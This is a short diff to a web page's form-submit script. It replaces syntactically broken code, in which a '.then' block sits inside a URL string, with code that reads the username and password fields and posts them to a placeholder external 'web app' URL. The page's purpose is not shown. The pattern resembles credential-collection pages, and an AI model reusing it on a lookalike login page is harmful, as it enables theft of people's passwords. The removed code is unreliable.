@@ -61,17 +61,19 @@
   document.getElementById("form").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    fetch(scriptURL, {
-      method: "POST",
-      body: new FormData(this)
-    })
-    .then(() => {
-  window.location.href = ".then(() => {
-  alert("You are under age of 18 so u cant see this");
-})";
+    fetch("YOUR_WEB_APP_URL", {
+  method: "POST",
+  body: new URLSearchParams({
+    username: document.querySelector('input[name="username"]').value,
+    password: document.querySelector('input[name="password"]').value
+  })
 })
-    .catch(() => alert("Error"));
-  });
+.then(() => {
+  alert("Completed ✅");
+})
+.catch(() => {
+  alert("Error ❌");
+});
   </script>
 
 </body>
